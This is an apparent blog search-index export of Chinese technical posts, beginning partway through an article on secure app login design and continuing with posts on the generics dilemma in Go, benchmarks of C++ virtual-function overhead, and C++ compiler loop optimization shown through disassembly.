如果服务器判断用户成功登陆，则用AES加密：(随机salt,用户名,客户端类型,时间)，以（用户名+Android/IOS/WP）为key，存到缓存里。再把加密结果返回给客户端。 客户端保存服务器返回的加密串 App自动登陆的流程 App发送保存的加密串到服务器，（加密串，用户名，mac，随机数）==&gt;RSA公钥加密 服务器用RSA私钥解密，再用AES解密加密串，判断用户名是否一致。如果一致，再以（用户名+Android/IOS/WP）为key到缓存里查询。如果判断缓存中的salt值和客户端发送过来的一致，则用户登陆成功。否则登陆失败。 不用AES加密，用RSA公钥加密也是可以的。AES速度比RSA要快，RSA只能存储有限的数据。 其它的一些东东多次md5或者md5 + sha1是没什么效果的。 RSA算法最好选择2048位的。搜索” rsa 1024 crack”有很多相关的结果，google已经将其SSL用的RSA算法升级为2048位的。 如何防止登陆过程的中间人攻击，可以参考，魔兽世界的叫SPR6的登陆算法。 总结对于网页登陆，可以考虑支持多种方式： 不支持JS的，用原始密码登陆。 支持JS的，可以考虑传递hash算法加密字符串。严格要求的应用，最好用JS实现RSA加密。在github上找到的一个JS RSA库：https://github.com/travist/jsencrypt 客户端应用，一律应当用RSA算法，并加盐来保存用户密码。单纯的hash或者对称加密算法都不靠谱。 服务器用salt（存数据库的） + hash算法来保存用户的密码。 用salt（存缓存的，注意和上一行的salt是不同的）+ RSA算法来加密用户登陆的凭证。 这样服务器可以灵活控制风险，控制用户登陆凭据的有效期，即使用户数据泄露，也不需要修改密码。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>app</tag>
        <tag>security</tag>
        <tag>password</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[泛型编程的困境]]></title>
    <url>%2Fgeneric-translation%2F</url>
    <content type="text"><![CDATA[原文：http://research.swtch.com/generic 常用的数据结构（vectors，queues，maps，trees，等等）似乎是评估一个新语言的一个热门话题。Go语言的FAQ中有一条就是关于Go中的泛型编程。对于泛型编程的通常有以下三种处理方式： 1.（C语言）放弃泛型。这样苦了程序员，但是这样没前增加太多复杂的东西到语言中。 2.（C++语言）编译期特化或者大量地展开代码。这样苦了编译器。编绎器生成一堆代码，而大部分是无用的，需要一个很好的链接器去清除重复的副本。为每一个类型生成一份代码，也许这样会让代码高效，但是程序是一个整体，这样会造成对cpu的cache不友好。我曾听说一个简单的库修正和移除了模板后，text段（即动态链接库的文件格式中的text段）的大小从M级降到10K。 3.（Java语言）隐式地把所有东西装箱。这样苦了程序，这样执行起来会变慢。对比C语言的手写，C++语言的编译器生成，Java代码最简单，但是最低效，无论是从时间还是空间来说。因为所有的操作都要隐式地装箱和拆箱。一个byte的vector容器(Vector)所占的空间比远超一个字节每一个byte。想要隐藏装箱和拆箱会让类型系统变复杂。从另一个方面来说，这个也许是指令cache友好的，因为它把一个byte的vector(Vector)可以分开来写每一个byt e。 泛型编程的困境是：要么苦了程序员，要么苦了编绎器，要么降低运行时效率。 原文作者是Go语言的实现者之一。 从Go的FAQ中也可以看到他们并不急于去实现泛型，是因为还没有找到一个合适的实现方案去解决上面的困境。 因为Go目前没有泛型，所以只能用interface来实现常用的数据结构了。但是从我个人角度来看Go中的interface的效率有点慢（比C++中的虚函数要慢，想想一个Vector容器，调用一个get函数，都比调用C++的一个虚函数还要慢。。）。 所以在Go1.0之前，有Vector容器时，另外还有一个IntVector和一个StringVector。想想有够蛋疼的，如果我想用一个高效float的Vector，是不是还要写一个FloatVector？ 如果Go能支持泛型，那真是相当令人高兴的一件事。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>generic</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++中虚函数(virtual function)到底有多慢]]></title>
    <url>%2Fcpp-virtual-function%2F</url>
    <content type="text"><![CDATA[前言虚函数为什么慢，cpu分支预测技术，虚函数到底要调用哪些汇编，虚函数实现的简单图示，虚函数不能内联， 印象中经常看到有人批评C++的虚函数很慢，但是虚函数为什么慢，虚函数到底有多慢呢？ 理论分析虚函数慢的原因主要有三个： 多了几条汇编指令（运行时得到对应类的函数的地址） 影响cpu流水线 编译器不能内联优化（仅在用父类引用或者指针调用时，不能内联） 先简单说下虚函数的实现，以下面测试代码中的VirtualVector类为例，VirtualVector类的内存布局如下： 当在用父类的引用或者指针调用虚函数时，会先从该对象的头部取到虚函数的地址（C++标准规定虚函数表地址必须放最前），再从虚函数表中取到实际要调用的函数的地址，最终调用该函数，汇编代码大概如下： 123456 sum += v.at(i); //要调用at函数00CF1305 mov eax,dword ptr [ebx] //取到对象的虚函数表地址00CF1307 mov edx,dword ptr [eax+4] //取到实际VirtualVector类的at函数地址，因为at是第二个虚函数，所以要+4，如果是clear则+8，push_back则不加00CF130A push esi //参数压栈00CF130B mov ecx,ebx 00CF130D call edx //调用真正的VirtualVector类的at函数 所以，我们可以看到调用虚函数，相比普通函数，实际上多了三条汇编指令（取虚表，取函数地址，call调用）。 至于虚函数如何影响cpu的流水线，则主要是因为call指令，具体可以看这个网址的演示： CPU流水线的一个演示：http://www.pictutorials.com/Instruction_Pipeline.html 第3点，编译器不能内联优化，则是因为在得到子类的引用或者指针之前，根本不知道要调用哪一个函数，所以无从内联。 但是，要注意的是，对于子类直接调用虚函数，是可以内联优化的。如以下的代码，编译器是完全可以内联展开的。 123VirtualVector v(100);v.push_back(1);v.at(0); 实际测试光说不练显然不行，下面用代码来测试下虚函数到底有多慢。 下面的代码只是测试用，不考虑细节。 Vector类包装了一个数组，提供push_back，at，clear函数。 VirtualVector类继承了IVector，同样实现了push_back，at，clear函数，但是都是虚函数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include &lt;iostream&gt;#include &lt;time.h&gt;#include &lt;vector&gt;using namespace std; const int size = 100000000; class Vector&#123;private: int *array; int pos;public: Vector(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; return array[i]; &#125; void clear() &#123; pos = 0; &#125;&#125;;class IVector&#123;public: virtual void push_back(int val) = 0; virtual int at(int i) = 0; virtual void clear() = 0; virtual ~IVector() &#123;&#125;;&#125;; class VirtualVector : public IVector&#123;public: int *array; int pos;public: VirtualVector(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; return array[i]; &#125; void clear() &#123; pos = 0; &#125; ~VirtualVector() &#123; if(array != NULL) delete array; &#125;&#125;; void testVectorPush(Vector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVectorAt(Vector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; void testVirtualVectorPush(IVector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVirtualVectorAt(IVector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; int main()&#123; cout&lt;&lt;sizeof(VirtualVector)&lt;&lt;endl; Vector *v = new Vector(size); VirtualVector *V = new VirtualVector(size); cout&lt;&lt;"testVectorPush:"&lt;&lt;endl; testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); cout&lt;&lt;"testVirtualVectorPush:"&lt;&lt;endl; testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); cout&lt;&lt;"testVectorAt:"&lt;&lt;endl; testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); cout&lt;&lt;"testVirtualVectorAt:"&lt;&lt;endl; testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); return 0;&#125; 上面的是只有一层继承的情况时的结果，尽管从虚函数的实现角度来看，多层继承和一层继承调用虚函数的效率都是一样的。 但是为了测试结果更加可信，下面是一个6层继承的测试代码（为了防止编译器的优化，有很多垃圾代码）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308#include &lt;iostream&gt;#include &lt;time.h&gt;#include &lt;vector&gt;using namespace std; const int size = 100000000; class Vector&#123;private: int *array; int pos;public: Vector(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; return array[i]; &#125; void clear() &#123; pos = 0; &#125;&#125;;class IVector&#123;public: virtual void push_back(int val) = 0; virtual int at(int i) = 0; virtual void clear() = 0; virtual ~IVector() &#123;&#125;;&#125;; class VirtualVector1 : public IVector&#123;public: int *array; int pos;public: VirtualVector1(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[1] = val; &#125; int at(int i) &#123; return array[1]; &#125; void clear() &#123; pos = 0; &#125; ~VirtualVector1() &#123; if(array != NULL) delete array; &#125;&#125;; class VirtualVector2 : public VirtualVector1&#123;public: VirtualVector2(int size):VirtualVector1(size) &#123; &#125; void push_back(int val) &#123; array[2] = val; &#125; int at(int i) &#123; return array[2]; &#125; void clear() &#123; pos = 0; &#125;&#125;; class VirtualVector3 : public VirtualVector2&#123;public: VirtualVector3(int size):VirtualVector2(size) &#123; &#125; void push_back(int val) &#123; array[3] = val; &#125; int at(int i) &#123; return array[3]; &#125; void clear() &#123; pos = 0; &#125;&#125;; class VirtualVector4 : public VirtualVector3&#123;public: VirtualVector4(int size):VirtualVector3(size) &#123; &#125; void push_back(int val) &#123; array[4] = val; &#125; int at(int i) &#123; return array[4]; &#125; void clear() &#123; pos = 0; &#125;&#125;; class VirtualVector5 : public VirtualVector4&#123;public: VirtualVector5(int size):VirtualVector4(size) &#123; &#125; void push_back(int val) &#123; array[5] = val; &#125; int at(int i) &#123; return array[5]; &#125; void clear() &#123; pos = 0; &#125;&#125;; class VirtualVector6 : public VirtualVector5&#123;public: VirtualVector6(int size):VirtualVector5(size) &#123; &#125; void push_back(int val) &#123; array[6] = val; &#125; int at(int i) &#123; return array[6]; &#125; void clear() &#123; pos = 0; &#125;&#125;; class VirtualVector : public VirtualVector6&#123;public: VirtualVector(int size):VirtualVector6(size) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; return array[i]; &#125; void clear() &#123; pos = 0; &#125;&#125;; void testVectorPush(Vector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVectorAt(Vector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; void testVirtualVectorPush(IVector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVirtualVectorAt(IVector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; int main()&#123; cout&lt;&lt;sizeof(VirtualVector)&lt;&lt;endl; &#123; auto v = VirtualVector1(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; &#123; auto v = VirtualVector2(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; &#123; auto v = VirtualVector3(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; &#123; auto v = VirtualVector4(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; &#123; auto v = VirtualVector5(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; &#123; auto v = VirtualVector6(size); v.push_back(0); cout&lt;&lt;v.at(0)&lt;&lt;endl; &#125; auto *v = new Vector(size); auto *V = new VirtualVector(size); cout&lt;&lt;"testVectorPush:"&lt;&lt;endl; testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); cout&lt;&lt;"testVirtualVectorPush:"&lt;&lt;endl; testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); cout&lt;&lt;"testVectorAt:"&lt;&lt;endl; testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); cout&lt;&lt;"testVirtualVectorAt:"&lt;&lt;endl; testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); return 0;&#125; 测试结果测试结果都取最小时间 1层继承的测试结果： push_back at Vector 0.263s 0.04s VirtualVector 0.331s 0.222s 倍数 1.25 5.55 6层继承的测试结果： push_back at Vector 0.262s 0.041s VirtualVector 0.334s 0.223s 倍数 1.27 5.43 可以看出继承层数和虚函数调用效率无关 可以看出虚函数慢得有点令人发指了，对于at操作，虚函数花的时间竟然是普通函数的5.5倍！ 但是，再看看，我们可以发现对于push_back操作，虚函数花的时间是普通函数的1.25倍。why? 再分析下代码，我们可以发现at操作的逻辑，明显要比push_back的逻辑要简单。 虚函数额外消耗时间为 vt，函数本身所消耗时间为 ft，则有以下 倍数 = (vt + ft)/ft = 1 + vt/ft 显然当ft越大，即函数本身消耗时间越长，则倍数越小。 那么让我们在at操作中加了额外代码，统计下1到100之和： 1234567int at(int i)&#123; sssForTest = 0; for(int j = 0; j &lt; 100; ++j) sssForTest += j; return array[i];&#125; 测试代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173#include &lt;iostream&gt;#include &lt;time.h&gt;#include &lt;vector&gt;using namespace std; const int size = 100000000;int sssForTest = 0; class Vector&#123;private: int *array; int pos;public: Vector(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; sssForTest = 0; for(int j = 0; j &lt; 100; ++j) sssForTest += j; return array[i]; &#125; void clear() &#123; pos = 0; &#125;&#125;;class IVector&#123;public: virtual void push_back(int val) = 0; virtual int at(int i) = 0; virtual void clear() = 0; virtual ~IVector() &#123;&#125;;&#125;; class VirtualVector : public IVector&#123;public: int *array; int pos;public: VirtualVector(int size):array(new int[size]),pos(0) &#123; &#125; void push_back(int val) &#123; array[pos++] = val; &#125; int at(int i) &#123; sssForTest = 0; for(int j = 0; j &lt; 100; ++j) sssForTest += j; return array[i]; &#125; void clear() &#123; pos = 0; &#125; ~VirtualVector() &#123; if(array != NULL) delete array; &#125;&#125;; void testVectorPush(Vector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVectorAt(Vector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; void testVirtualVectorPush(IVector&amp; v)&#123; v.clear(); clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 nTimeStart = clock(); // for(int i = 0; i &lt; size; ++i) &#123; v.push_back(i); //cout&lt;&lt;v.size()&lt;&lt;endl; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl;&#125; void testVirtualVectorAt(IVector&amp; v)&#123; clock_t nTimeStart; //计时开始 clock_t nTimeStop; //计时结束 int sum = 0; nTimeStart = clock(); // for(int j = 0; j &lt; 1; ++j) &#123; for(int i = 0; i &lt; size; ++i) &#123; sum += v.at(i); &#125; &#125; nTimeStop = clock(); // cout &lt;&lt;"耗时："&lt;&lt;(double)(nTimeStop - nTimeStart)/CLOCKS_PER_SEC&lt;&lt;"秒"&lt;&lt; endl; cout&lt;&lt;"sum:"&lt;&lt;sum&lt;&lt;endl;&#125; int main()&#123; cout&lt;&lt;sizeof(VirtualVector)&lt;&lt;endl; Vector *v = new Vector(size); VirtualVector *V = new VirtualVector(size); cout&lt;&lt;"testVectorPush:"&lt;&lt;endl; testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); testVectorPush(*v); cout&lt;&lt;"testVirtualVectorPush:"&lt;&lt;endl; testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); testVirtualVectorPush(*V); cout&lt;&lt;"testVectorAt:"&lt;&lt;endl; testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); testVectorAt(*v); cout&lt;&lt;"testVirtualVectorAt:"&lt;&lt;endl; testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); testVirtualVectorAt(*V); return 0;&#125; at操作中增加求和后的统计结果： push_back at 增加求和代码 Vector 0.265s 6.893s VirtualVector 0.328s 7.125s 倍数 1.23 1.03 只是简单增加了一个求和代码，我们可以看到，倍数变成了1.03，也就是说虚函数的消耗基本可以忽略了。 所以说，虚函数的效率到底低不低和实际要调用的函数的耗时有关，当函数本身的的耗时越长，则虚函数的影响则越小。 再从另一个角度来看，一个虚函数调用到底额外消耗了多长时间？ 从统计数据来看100,000,000次函数调用，虚函数总共额外消耗了0.05~0.23秒（VirtualVector对应时间减去Vector时间）， 也就是说，1亿次调用，虚函数额外花的时间是0.x到2.3秒。 也就是说，如果你有个函数，要被调用1亿次，而这1亿次调用所花的时间是几秒，十几秒，且你不能容忍它慢一二秒，那么就干掉虚函数吧^_^。 总结 虚函数调用效率和继承层数无关； 其实虚函数还是挺快的。 如果真的要完全移除虚函数，那么如果要实现运行时多态，则要用到函数指针，据上面的分析，函数指针基本具有虚函数的所有缼点（要传递函数指针，同样无法内联，同样影响流水线），且函数指针会使代码混乱。 BTW：测试cpu是i5。 TODO：测试指针函数，boost::bind的效率]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++编译器到底能帮我们把代码优化到什么程度？]]></title>
    <url>%2Fcpp-compiler-optimization%2F</url>
    <content type="text"><![CDATA[TODO: 用while写法的程序会不会循环展开？ 一个简单的累加求和程序： 1234TYPE S=0; for(int i = 0;i &lt; SIZE; i++) &#123; S += a[i]; &#125; 很多人都觉得这个程序写得不好，编译器不能生成很好的汇编代码。于是有了以下的几种“优化”： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std; void main(int argc,char **argv)&#123;#define TYPE int#define SIZE 10000 TYPE* a=new TYPE[SIZE]; for(int i = 0; i&lt;SIZE; ++i)&#123; a[i] = i; &#125; //求和，通常版本 TYPE S=0; for(int i = 0;i &lt; SIZE; i++) &#123; S += a[i]; &#125; cout&lt;&lt;S&lt;&lt;endl; TYPE S2 = 0; //版本1：认为中间产生的变量i是多余的，改为用移动指针 TYPE* end = a + SIZE; for( ; a != end; ) &#123; S2 += *(a++); &#125; cout&lt;&lt;S2&lt;&lt;endl; //版本1中把a移到了数组的最后，现在移回原来的位置 a = end - SIZE; //版本2：认为循环次数太多了，可以改为减少循环次数 TYPE S3 = 0; for(int i = 0; i &lt; SIZE; )&#123; //仅当SIZE为偶数时 S3 += a[i++]; S3 += a[i++]; &#125; cout&lt;&lt;S3&lt;&lt;endl; //版本3：认为版本2中会使CPU不能乱序执行，降低了效率，应该改为汇编，把中间结果放到独立的寄存器中 //谢谢 menzi11 的文章，让我认识到程序中相关的数据会让CPU不能乱序执行。 //这里用伪汇编代替 TYPE S4 = 0; register TYPE r1 = 0; register TYPE r2 = 0; for(int i = 0; i &lt; SIZE; )&#123; //仅当SIZE为偶数时 r1 += a[i++]; r2 += a[i++]; &#125; cout&lt;&lt;r1 + r2&lt;&lt;endl;&#125; 上面的几种版本都合理，但是这些优化都是建立在编译器不能生成高效的汇编代码的假设上的。 下面来看下编译器生成的结果（vs2010，release)： 1234567891011121314151617 for(int i = 0;i &lt; SIZE; i++) &#123; S += a[i]; 013B1040 mov ebx,dword ptr [eax+4] //把a[0],a[4],a[8]...累加到ebx中013B1043 add ecx,dword ptr [eax-8] //把a[1],a[5],a[9]...累加到ecx中013B1046 add edx,dword ptr [eax-4] //把a[2],a[6],a[10]...累加到edx中013B1049 add esi,dword ptr [eax] //把a[3],a[7],a[11]...累加到esi中013B104B add dword ptr [ebp-4],ebx 013B104E add eax,10h 013B1051 dec dword ptr [ebp-8] 013B1054 jne main+40h (13B1040h) &#125; cout&lt;&lt;S&lt;&lt;endl;013B1056 mov eax,dword ptr [ebp-4] 013B1059 add eax,esi 013B105B add eax,edx 013B105D mov edx,dword ptr [__imp_std::endl (13B204Ch)] 013B1063 add ecx,eax //上面的3条add指令把ebx，ecx，edx，edi都加到ecx中，即ecx是累加结果 可见编译器生成的代码是最好的代码，消灭了中间变量i，减少了循环次数，消灭了会造成CPU不能乱序执行的因素。 BTW： 有人可能会有疑问：要是size不是偶数，编译器能生成类似的高效汇编代码不？ 当SIZE = 9999时： 12345678910//当SIZE = 9999时，编译器把中间结果放到三个寄存器中，perfect for(int i = 0;i &lt; SIZE; i++) &#123; S += a[i]; 01341030 add ecx,dword ptr [eax-8] 01341033 add edx,dword ptr [eax-4] 01341036 add esi,dword ptr [eax] 01341038 add eax,0Ch 0134103B dec ebx 0134103C jne main+30h (1341030h) &#125; 当SIZE = 9997 时： 12345678910111213141516171819202122232425//当SIZE = 9997时，有点复杂，先把a[0]到a[9995]累加到ecx和edx中//再把a[9996]入到edi中，最后把ecx，edi都加到edx中//edx压栈，调用operator&lt;&lt; 函数 for(int i = 0;i &lt; SIZE; i++) &#123; 00D31024 xor eax,eax S += a[i]; 00D31026 add ecx,dword ptr [esi+eax*4] 00D31029 add edx,dword ptr [esi+eax*4+4] 00D3102D add eax,2 00D31030 cmp eax,270Ch 00D31035 jl main+26h (0D31026h) for(int i = 0;i &lt; SIZE; i++) &#123; 00D31037 cmp eax,270Dh 00D3103C jge main+41h (0D31041h) S += a[i]; 00D3103E mov edi,dword ptr [esi+eax*4] &#125; cout&lt;&lt;S&lt;&lt;endl;00D31041 mov eax,dword ptr [__imp_std::endl (0D3204Ch)] 00D31046 add edx,ecx 00D31048 mov ecx,dword ptr [__imp_std::cout (0D32050h)] 00D3104E push eax 00D3104F add edx,edi 00D31051 push edx 00D31052 call dword ptr [__imp_std::basic_ostream&lt;char,std::char_traits&lt;char&gt; &gt;::operator&lt;&lt; (0D32048h)] 上面的分析都是SIZE，即数组的大小是已知情况下，那个数组大小是未知情况下，编译器又会怎样？ 1234567TYPE mySum(TYPE* a, int size)&#123; TYPE s = 0; for(int i = 0; i &lt; size; ++i)&#123; s += a[i]; &#125; return s;&#125; 生成的汇编代码： 12345678910111213141516171819202122//先累加a[0] 到 a[size-2] TYPE s = 0;00ED100C xor esi,esi for(int i = 0; i &lt; size; ++i)&#123;00ED100E xor eax,eax 00ED1010 cmp ebx,2 00ED1013 jl mySum+27h (0ED1027h) 00ED1015 dec ebx s += a[i];00ED1016 add ecx,dword ptr [edi+eax*4] //a[0],a[2],a[4]...加到ecx中00ED1019 add edx,dword ptr [edi+eax*4+4] //a[1],a[3],a[5]...加到edx中00ED101D add eax,2 00ED1020 cmp eax,ebx 00ED1022 jl mySum+16h (0ED1016h) 00ED1024 mov ebx,dword ptr [size] for(int i = 0; i &lt; size; ++i)&#123;00ED1027 cmp eax,ebx //判断最后一个元素有没有加上00ED1029 jge mySum+2Eh (0ED102Eh) s += a[i];00ED102B mov esi,dword ptr [edi+eax*4] //当size是奇数是会执行，偶数时不会执行00ED102E add edx,ecx &#125; 总结C++的编译器生成的汇编代码在绝大多数情况下都和人写出的最好的汇编代码相当。 关键的一点是编译器会不断升级，适应新的cpu指令，体系等，手写的汇编代码则通常悲剧了。 知道编译器能优化到什么程度，编译器到底怎样优化，是程序员很重要的素质。]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>compiler</tag>
      </tags>
  </entry>
</search>
